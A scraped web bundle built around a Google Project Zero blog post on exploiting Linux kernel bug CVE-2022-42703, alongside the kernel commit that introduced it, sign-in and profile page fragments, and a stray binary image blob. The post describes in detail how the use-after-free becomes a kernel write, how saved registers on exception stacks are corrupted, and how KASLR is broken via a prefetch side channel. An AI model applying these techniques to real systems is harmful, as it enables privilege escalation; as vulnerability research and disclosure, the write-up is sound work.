to continue to BloggerEmail or phoneForgot email?![CAPTCHA image of text used to distinguish humans from robots]()Type the text you hear or seeNot your computer? Use Guest mode to sign in privately. [Learn more about using Guest mode](https://support.google.com/chrome/answer/6130773?hl=en-US)NextCreate account

=== Content from git.kernel.org_a83d25dd_20250115_140219.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=7a3ef208e662f)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=7a3ef208e662f)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7a3ef208e662f)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=7a3ef208e662f)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Konstantin Khlebnikov <koct9i@gmail.com> | 2015-01-08 14:32:15 -0800 |
| --- | --- | --- |
| committer | Linus Torvalds <torvalds@linux-foundation.org> | 2015-01-08 15:10:51 -0800 |
| commit | [7a3ef208e662f4b63d43a23f61a64a129c525bbc](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7a3ef208e662f4b63d43a23f61a64a129c525bbc) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=7a3ef208e662f4b63d43a23f61a64a129c525bbc)) | |
| tree | [130f561d487db5224bf6501fdd7182c92eb7ff8e](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=7a3ef208e662f) | |
| parent | [3245d6acab981a2388ffb877c7ecc97e763c59d4](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3245d6acab981a2388ffb877c7ecc97e763c59d4) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=7a3ef208e662f&id2=3245d6acab981a2388ffb877c7ecc97e763c59d4)) | |
| download | [linux-7a3ef208e662f.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-7a3ef208e662f.tar.gz) | |

mm: prevent endless growth of anon\_vma hierarchyConstantly forking task causes unlimited grow of anon\_vma chain. Each
next child allocates new level of anon\_vmas and links vma to all
previous levels because pages might be inherited from any level.
This patch adds heuristic which decides to reuse existing anon\_vma
instead of forking new one. It adds counter anon\_vma->degree which
counts linked vmas and directly descending anon\_vmas and reuses anon\_vma
if counter is lower than two. As a result each anon\_vma has either vma
or at least two descending anon\_vmas. In such trees half of nodes are
leafs with alive vmas, thus count of anon\_vmas is no more than two times
bigger than count of vmas.
This heuristic reuses anon\_vmas as few as possible because each reuse
adds false aliasing among vmas and rmap walker ought to scan more ptes
when it searches where page is might be mapped.
Link: [http://lkml.kernel.org/r/20120816024610.GA5350@evergreen.ssec.wisc.edu](http://lkml.kernel.org/r/20120816024610.GA5350%40evergreen.ssec.wisc.edu)
Fixes: 5beb49305251 ("mm: change anon\_vma linking to fix multi-process server scalability issue")
[akpm@linux-foundation.org: fix typo, per Rik]
Signed-off-by: Konstantin Khlebnikov <koct9i@gmail.com>
Reported-by: Daniel Forrest <dan.forrest@ssec.wisc.edu>
Tested-by: Michal Hocko <mhocko@suse.cz>
Tested-by: Jerome Marchand <jmarchan@redhat.com>
Reviewed-by: Michal Hocko <mhocko@suse.cz>
Reviewed-by: Rik van Riel <riel@redhat.com>
Cc: <stable@vger.kernel.org> [2.6.34+]
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=7a3ef208e662f)

| -rw-r--r-- | [include/linux/rmap.h](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/include/linux/rmap.h?id=7a3ef208e662f) | 10 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [mm/rmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/mm/rmap.c?id=7a3ef208e662f) | 42 | |  |  |  | | --- | --- | --- | |

2 files changed, 51 insertions, 1 deletions

| diff --git a/include/linux/rmap.h b/include/linux/rmap.hindex c0c2bce6b0b7ba..d9d7e7e56352a8 100644--- a/[include/linux/rmap.h](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/rmap.h?id=3245d6acab981a2388ffb877c7ecc97e763c59d4)+++ b/[include/linux/rmap.h](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/rmap.h?id=7a3ef208e662f4b63d43a23f61a64a129c525bbc)@@ -37,6 +37,16 @@ struct anon\_vma { atomic\_t refcount;  /\*+ \* Count of child anon\_vmas and VMAs which points to this anon\_vma.+ \*+ \* This counter is used for making decision about reusing anon\_vma+ \* instead of forking new one. See comments in function anon\_vma\_clone.+ \*/+ unsigned degree;++ struct anon\_vma \*parent; /\* Parent of this anon\_vma \*/++ /\* \* NOTE: the LSB of the rb\_root.rb\_node is set by \* mm\_take\_all\_locks() \_after\_ taking the above lock. So the \* rb\_root must only be read/written after taking the above lockdiff --git a/mm/rmap.c b/mm/rmap.cindex c5bc241127b205..71cd5bd0c17d76 100644--- a/[mm/rmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/rmap.c?id=3245d6acab981a2388ffb877c7ecc97e763c59d4)+++ b/[mm/rmap.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/rmap.c?id=7a3ef208e662f4b63d43a23f61a64a129c525bbc)@@ -72,6 +72,8 @@ static inline struct anon\_vma \*anon\_vma\_alloc(void) anon\_vma = kmem\_cache\_alloc(anon\_vma\_cachep, GFP\_KERNEL); if (anon\_vma) { atomic\_set(&anon\_vma->refcount, 1);+ anon\_vma->degree = 1; /\* Reference for first vma \*/+ anon\_vma->parent = anon\_vma; /\* \* Initialise the anon\_vma root to point to itself. If called \* from fork, the root will be reset to the parents anon\_vma.@@ -188,6 +190,8 @@ int anon\_vma\_prepare(struct vm\_area\_struct \*vma) if (likely(!vma->anon\_vma)) { vma->anon\_vma = anon\_vma; anon\_vma\_chain\_link(vma, avc, anon\_vma);+ /\* vma reference or self-parent link for new root \*/+ anon\_vma->degree++; allocated = NULL; avc = NULL; }@@ -236,6 +240,14 @@ static inline void unlock\_anon\_vma\_root(struct anon\_vma \*root) /\* \* Attach the anon\_vmas from src to dst. \* Returns 0 on success, -ENOMEM on failure.+ \*+ \* If dst->anon\_vma is NULL this function tries to find and reuse existing+ \* anon\_vma which has no vmas and only one child anon\_vma. This prevents+ \* degradation of anon\_vma hierarchy to endless linear chain in case of+ \* constantly forking task. On the other hand, an anon\_vma with more than one+ \* child isn't reused even if there was no alive vma, thus rmap walker has a+ \* good chance of avoiding scanning the whole hierarchy when it searches where+ \* page is mapped. \*/ int anon\_vma\_clone(struct vm\_area\_struct \*dst, struct vm\_area\_struct \*src) {@@ -256,7 +268,21 @@ int anon\_vma\_clone(struct vm\_area\_struct \*dst, struct vm\_area\_struct \*src) anon\_vma = pavc->anon\_vma; root = lock\_anon\_vma\_root(root, anon\_vma); anon\_vma\_chain\_link(dst, avc, anon\_vma);++ /\*+ \* Reuse existing anon\_vma if its degree lower than two,+ \* that means it has no vma and only one anon\_vma child.+ \*+ \* Do not chose parent anon\_vma, otherwise first child+ \* will always reuse it. Root anon\_vma is never reused:+ \* it has self-parent reference and at least one child.+ \*/+ if (!dst->anon\_vma && anon\_vma != src->anon\_vma &&+ anon\_vma->degree < 2)+ dst->anon\_vma = anon\_vma; }+ if (dst->anon\_vma)+ dst->anon\_vma->degree++; unlock\_anon\_vma\_root(root); return 0; @@ -280,6 +306,9 @@ int anon\_vma\_fork(struct vm\_area\_struct \*vma, struct vm\_area\_struct \*pvma) if (!pvma->anon\_vma) return 0; + /\* Drop inherited anon\_vma, we'll reuse existing or allocate new. \*/+ vma->anon\_vma = NULL;+ /\* \* First, attach the new VMA to the parent VMA's anon\_vmas, \* so rmap can find non-COWed pages in child processes.@@ -288,6 +317,10 @@ int anon\_vma\_fork(struct vm\_area\_struct \*vma, struct vm\_area\_struct \*pvma) if (error) return error; + /\* An existing anon\_vma has been reused, all done then. \*/+ if (vma->anon\_vma)+ return 0;+ /\* Then add our own anon\_vma. \*/ anon\_vma = anon\_vma\_alloc(); if (!anon\_vma)@@ -301,6 +334,7 @@ int anon\_vma\_fork(struct vm\_area\_struct \*vma, struct vm\_area\_struct \*pvma) \* lock any of the anon\_vmas in this anon\_vma tree. \*/ anon\_vma->root = pvma->anon\_vma->root;+ anon\_vma->parent = pvma->anon\_vma; /\* \* With refcounts, an anon\_vma can stay around longer than the \* process it belongs to. The root anon\_vma needs to be pinned until@@ -311,6 +345,7 @@ int anon\_vma\_fork(struct vm\_area\_struct \*vma, struct vm\_area\_struct \*pvma) vma->anon\_vma = anon\_vma; anon\_vma\_lock\_write(anon\_vma); anon\_vma\_chain\_link(vma, avc, anon\_vma);+ anon\_vma->parent->degree++; anon\_vma\_unlock\_write(anon\_vma);  return 0;@@ -341,12 +376,16 @@ void unlink\_anon\_vmas(struct vm\_area\_struct \*vma) \* Leave empty anon\_vmas on the list - we'll need \* to free them outside the lock. \*/- if (RB\_EMPTY\_ROOT(&anon\_vma->rb\_root))+ if (RB\_EMPTY\_ROOT(&anon\_vma->rb\_root)) {+ anon\_vma->parent->degree--; continue;+ }  list\_del(&avc->same\_vma); anon\_vma\_chain\_free(avc); }+ if (vma->anon\_vma)+ vma->anon\_vma->degree--; unlock\_anon\_vma\_root(root);  /\*@@ -357,6 +396,7 @@ void unlink\_anon\_vmas(struct vm\_area\_struct \*vma) list\_for\_each\_entry\_safe(avc, next, &vma->anon\_vma\_chain, same\_vma) { struct anon\_vma \*anon\_vma = avc->anon\_vma; + BUG\_ON(anon\_vma->degree); put\_anon\_vma(anon\_vma);  list\_del(&avc->same\_vma); |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-15 14:00:56 +0000



=== Content from www.blogger.com_d9fa137c_20250115_225525.html ===

[![](/img/blogger-logotype-color-black-1x.png)](/blogger.g "Blogger")[Sign in](https://accounts.google.com/ServiceLogin?service=blogger&continue=https://www.blogger.com/blogger.g&ec=GAZAHg)Google appsMain menu

# Google Project Zero

![My Photo](/img/avatar_blue_m_96.png)

On Blogger since
May 2022

Profile views
-
33321

[Report Abuse](//www.blogger.com/go/report-abuse)

## My blogs

* [Project Zero](http://googleprojectzero.blogspot.com/)

## About me

##### Help

* [Help Centre](https://www.blogger.com/go/helpcenter)
* [Help Forum](https://www.blogger.com/go/discuss)
* [Video Tutorials](https://www.blogger.com/go/tutorials)

##### Community

* [Blogger Buzz](https://www.blogger.com/go/buzz)

##### Developers

* [Blogger API](https://www.blogger.com/go/devapi)
* [Developer Forum](https://www.blogger.com/go/devforum)

© 1999 – 2025 Google

* [Terms of Service](https://www.blogger.com/go/terms)
* [Privacy](https://www.blogger.com/go/privacy)
* [Content Policy](https://www.blogger.com/go/contentpolicy)



=== Content from resources.blogblog.com_5fcf17bb_20250115_225529.html ===
GIF89a  �  �ǻ�j4TSP�%    Џ)I5���S(3&��1��#�ǻ!�   ,       O��I���`���(�1�� �
"N�(!�3���wH@1� �憐 ��ra
 R�� ��/��yL `M�J ;

=== Content from googleprojectzero.blogspot.com_912d3ce9_20250115_225525.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Thursday, December 8, 2022

### [Exploiting CVE-2022-42703 - Bringing back the stack attack](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html)

Seth Jenkins, Project Zero

This blog post details an exploit for [CVE-2022-42703](https://bugs.chromium.org/p/project-zero/issues/list?q=label:CVE-2022-42703) (P0 [issue 2351](https://bugs.chromium.org/p/project-zero/issues/detail?id=2351) - Fixed 5 September 2022), a bug Jann Horn found in the Linux kernel's memory management (MM) subsystem that leads to a use-after-free on struct anon\_vma. As the bug is very complex (I certainly struggle to understand it!), a future blog post will describe the bug in full. For the time being, the [issue tracker entry](https://bugs.chromium.org/p/project-zero/issues/detail?id=2351), [this LWN article](https://lwn.net/Articles/383162/) explaining what an anon\_vma is and [the commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7a3ef208e662f) that introduced the bug are great resources in order to gain additional context.

## Setting the scene

Successfully triggering the underlying vulnerability causes folio->mapping to point to a freed anon\_vma object. Calling madvise(..., MADV\_PAGEOUT)can then be used to repeatedly trigger accesses to the freed anon\_vma in folio\_lock\_anon\_vma\_read():

struct anon\_vma \*folio\_lock\_anon\_vma\_read(struct folio \*folio,

       struct rmap\_walk\_control \*rwc)

{

 struct anon\_vma \*anon\_vma = NULL;

 struct anon\_vma \*root\_anon\_vma;

 unsigned long anon\_mapping;

 rcu\_read\_lock();

 anon\_mapping = (unsigned long)READ\_ONCE(folio->mapping);

 if ((anon\_mapping & PAGE\_MAPPING\_FLAGS) != PAGE\_MAPPING\_ANON)

  goto out;

 if (!folio\_mapped(folio))

  goto out;

 // anon\_vma is dangling pointer

 anon\_vma = (struct anon\_vma \*) (anon\_mapping - PAGE\_MAPPING\_ANON);

 // root\_anon\_vma is read from dangling pointer

 root\_anon\_vma = READ\_ONCE(anon\_vma->root);

 if (down\_read\_trylock(&root\_anon\_vma->rwsem)) {

[...]

  if (!folio\_mapped(folio)) { // false

[...]

  }

  goto out;

 }

 if (rwc && rwc->try\_lock) { // true

  anon\_vma = NULL;

  rwc->contended = true;

  goto out;

 }

[...]

out:

 rcu\_read\_unlock();

 return anon\_vma; // return dangling pointer

}

One potential exploit technique is to let the function return the dangling anon\_vma pointer and try to make the subsequent operations do something useful. Instead, we chose to use the down\_read\_trylock() call within the function to corrupt memory at a chosen address, which we can do if we can control the root\_anon\_vma pointer that is read from the freed anon\_vma.

Controlling the root\_anon\_vma pointer means reclaiming the freed anon\_vma with attacker-controlled memory. struct anon\_vma structures are allocated from their own kmalloc cache, which means we cannot simply free one and reclaim it with a different object. Instead we cause the associated anon\_vma slab page to be returned back to the kernel page allocator by following a very similar strategy to the one documented [here](https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html). By freeing all the anon\_vma objects on a slab page, then flushing the percpu slab page partial freelist, we can cause the virtual memory previously associated with the anon\_vma to be returned back to the page allocator. We then spray pipe buffers in order to reclaim the freed anon\_vma with attacker controlled memory.

At this point, we’ve discussed how to turn our use-after-free into a down\_read\_trylock() call on an attacker-controlled pointer. The implementation of down\_read\_trylock() is as follows:

struct rw\_semaphore {

 atomic\_long\_t count;

 atomic\_long\_t owner;

 struct optimistic\_spin\_queue osq; /\* spinner MCS lock \*/

 raw\_spinlock\_t wait\_lock;

 struct list\_head wait\_list;

};

...

static inline int \_\_down\_read\_trylock(struct rw\_semaphore \*sem)

{

 long tmp;

 DEBUG\_RWSEMS\_WARN\_ON(sem->magic != sem, sem);

 tmp = atomic\_long\_read(&sem->count);

 while (!(tmp & RWSEM\_READ\_FAILED\_MASK)) {

  if (atomic\_long\_try\_cmpxchg\_acquire(&sem->count, &tmp,

          tmp + RWSEM\_READER\_BIAS)) {

   rwsem\_set\_reader\_owned(sem);

   return 1;

  }

 }

 return 0;

}

It was helpful to emulate the down\_read\_trylock() in unicorn to determine how it behaves when given different sem->count values. Assuming this code is operating on inert and unchanging memory, it will increment sem->count by 0x100 if the 3 least significant bits and the most significant bit are all unset. That means it is difficult to modify a kernel pointer and we cannot modify any non 8-byte aligned values (as they’ll have one or more of the bottom three bits set). Additionally, this semaphore is later unlocked, causing whatever write we perform to be reverted in the imminent future. Furthermore, at this point we don’t have an established strategy for determining the KASLR slide nor figuring out the addresses of any objects we might want to overwrite with our newfound primitive. It turns out that regardless of any randomization the kernel presently has in place, there’s a straightforward strategy for exploiting this bug even given such a constrained arbitrary write.

## Stack corruption…

On x86-64 Linux, when the CPU performs certain interrupts and exceptions, it will swap to a respective stack that is mapped to a static and non-randomized virtual address, with a different stack for the different exception types. A brief documentation of those stacks and their parent structure, the cpu\_entry\_area, can be found [here.](https://docs.kernel.org/x86/pti.html) These stacks are most often used on entry into the kernel from userland, but they’re used for exceptions that happen in kernel mode as well. We’ve recently seen [KCTF](https://google.github.io/kctf/vrp.html) entries where attackers take advantage of the non-randomized cpu\_entry\_area stacks in order to access data at a known virtual address in kernel accessible memory even in the presence of SMAP and KASLR. You could also use these stacks to forge attacker-controlled data at a known kernel virtual address. This works because the attacker task’s general purpose register contents are pushed directly onto this stack when the switch from userland to kernel mode occurs due to one of these exceptions. This also occurs when the kernel itself generates an Interrupt Stack Table exception and swaps to an exception stack - except in that case, kernel GPR’s are pushed instead. These pushed registers are later used to restore kernel state once the exception is handled. In the case of a userland triggered exception, register contents are restored from the task stack.

One example of an IST exception is a DB exception which can be triggered by an attacker via a hardware breakpoint, the associated registers of which are described [here](https://pdos.csail.mit.edu/6.828/2004/readings/i386/s12_02.htm). Hardware breakpoints can be triggered by a variety of different memory access types, namely reads, writes, and instruction fetches. These hardware breakpoints can be set using ptrace(2), and are preserved during kernel mode execution in a task context such as during a syscall. That means that it’s possible for an attacker-set hardware breakpoint to be triggered in kernel mode, e.g. during a copy\_to/from\_user call. The resulting exception will save and restore the kernel context via the aforementioned non-randomized exception stack, and that kernel context is an exceptionally good target for our arbitrary write primitive.

Any of the registers that copy\_to/from\_user is actively using at the time it handles the hardware breakpoint are corruptible by using our arbitrary-write primitive to overwrite their saved values on the exception stack. In this case, the size of the copy\_user call is the intuitive target. The size value is consistently stored in the rcx register, which will be saved at the same virtual address every time the hardware breakpoint is hit. After corrupting this saved register with our arbitrary write primitive, the kernel will restore rcx from the exception stack once it returns back to copy\_to/from\_user. Since rcx defines the number of bytes copy\_user should copy, this corruption will cause the kernel to illicitly copy too many bytes between userland and the kernel.

## …begets stack corruption

The attack strategy starts as follows:

1. Fork a process Y from process X.
2. Process X ptraces process Y, then sets a hardware breakpoint at a known virtual address [addr] in process Y.
3. Process Y makes a large number of calls to uname(2), which calls copy\_to\_user from a kernel stack buffer to [addr]. This causes the kernel to constantly trigger the hardware watchpoint and enter the DB exception handler, using the DB exception stack to save and restore copy\_to\_user state
4. Simultaneously make many arbitrary writes at the known location of the DB exception stack’s saved rcx value, which is Process Y’s copy\_to\_user’s saved length.

[![DB Exception handling while the arbitrary write primitive writes to the CEA stack leads to corruption of the rcx register](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/w508-h640/image3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/s1111/image3.png)

The DB exception stack is used rarely, so it’s unlikely that we corrupt any unexpected kernel state via a spurious DB exception while spamming our arbitrary write primitive. The technique is also racy, but missing the race simply means corrupting stale stack-data. In that case, we simply try again. In my experience, it rarely takes more than a few seconds to win the race successfully.

Upon successful corruption of the length value, the kernel will copy much of the current task’s stack back to userland, including the task-local stack cookie and return addresses. We can subsequently invert our technique and attack a copy\_from\_user call instead. Instead of copying too many bytes from the kernel task stack to userland, we elicit the kernel to copy too many bytes from userland to the kernel task stack! Again we use a syscall, prctl(2), that performs a copy\_from\_user call to a kernel stack buffer. Now by corrupting the length value, we generate a stack buffer overflow condition in this function where none previously existed. Since we’ve already leaked the stack cookie and the KASLR slide, it is trivially easy to bypass both mitigations and overwrite the return address.

[![Image showing that we’ve gained control of the instruction pointer](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/w640-h420/image2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/s555/image2.png)

Completing a ROP chain for the kernel is left as an exercise to the reader.

## Fetching the KASLR slide with prefetch

Upon reporting this bug to the Linux kernel security team, our suggestion was to start randomizing the location of the percpu cpu\_entry\_area (CEA), and consequently the associated exception and syscall entry stacks. This is an effective mitigation against remote attackers but is insufficient to prevent a local attacker from taking advantage. 6 years ago, Daniel Gruss et al. [discovered a new more reliable technique for exploiting the TLB timing side channel in x86 CPU’s](https://gruss.cc/files/prefetch.pdf). Their results demonstrated that prefetch instructions executed in user mode retired at statistically significant different latencies depending on whether the requested virtual address to be prefetched was mapped vs unmapped, even if that virtual address was only mapped in kernel mode. [kPTI](https://docs.kernel.org/x86/pti.html) was helpful in mitigating this side channel, however, most modern CPUs now have innate protection for Meltdown, which kPTI was specifically designed to address, and thusly kPTI (which has significant performance implications) is disabled on modern microarchitectures. That decision means it is once again possible to take advantage of the prefetch side channel to defeat not only KASLR, but also the CPU entry area randomization mitigation, preserving the viability of the CEA stack corruption exploit technique against modern X86 CPUs.

There are surprisingly few fast and reliable examples of this prefetch KASLR bypass technique available in the open source realm, so I made the decision to write one.

## Implementation

The meat of implementing this technique effectively is in serially reading the processor’s time stamp counter before and after performing a prefetch. [Daniel Gruss helpfully provided highly effective and open source code for doing just that.](https://github.com/IAIK/prefetch) The only edit I made (as suggested by Jann Horn) was to swap to using lfence instead of cpuid as the serializing instruction, as cpuid is emulated in VM environments. It also became apparent in practice that there was no need to perform any cache-flushing routines in order to witness the side-channel effect. It is simply enough to time every prefetch attempt.

Generating prefetch timings for all 512 possible KASLR slots yields quite a bit of fuzzy data in need of analyzing. To minimize noise, multiple samples of each tested address are taken, and the minimum value from that set of samples is used in the results as the representative value for an address. On the Tiger Lake CPU this test was primarily performed on, no more than 16 samples per slot were needed to generate exceptionally reliable results. Low-resolution minimum prefetch time slot identification narrows down the area to search in while avoiding false positives for the higher resolution edge-detection code which finds the precise address at which prefetch dramatically drops in run-time. The result of this effort is a PoC which can correctly identify the KASLR slide on my local machine with 99.999% accuracy (95% accuracy in a VM) while running faster than it takes to grep through kallsyms for the kernel base address:

[![Breaking KASLR with Prefecth: Grepping through kallsyms took .077 seconds while using the prefetch technique took .013 seconds](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/w640-h220/image1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/s891/image1.png)

This prefetch code does indeed work to find the locations of the randomized CEA regions in Peter Ziljstra’s proposed patch. However, the journey to that point results in code that demonstrates another deeply significant issue - KASLR is comprehensively compromised on x86 against local attackers, and has been for the past several years, and will be for the indefinite future. There are presently no plans in place to resolve the myriad microarchitectural issues that lead to side channels like this one. Future work is needed in this area in order to preserve the integrity of KASLR, or alternatively, it is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.

## Conclusion

This exploit demonstrates a highly reliable and agnostic technique that can allow a broad spectrum of uncontrolled arbitrary write primitives to achieve kernel code execution on x86 platforms. While it is possible to mitigate this exploit technique from a remote context, an attacker in a local context can utilize known microarchitectural side-channels to defeat the current mitigations. Additional work in this area might be valuable to continue to make exploitation more difficult, such as performing in-stack randomization so that the stack offset of the saved state changes on every taken IST exception. For now however, this remains a viable and powerful exploit strategy on x86 Linux.

Posted by

[Google Project Zero](https://www.blogger.com/profile/08975904405228580347 "author profile")

at

[11:04 AM](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=2515628030502752973&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=pinterest "Share to Pinterest")

[Newer Posts](https://googleprojectzero.blogspot.com/search?updated-max=2023-01-19T09:33:00-08:00&max-results=1&reverse-paginate=true "Newer Posts")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2022-12-08T11:04:00-08:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ▼
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ▼
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
    - [Exploiting CVE-2022-42703 - Bringing back the stac...](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
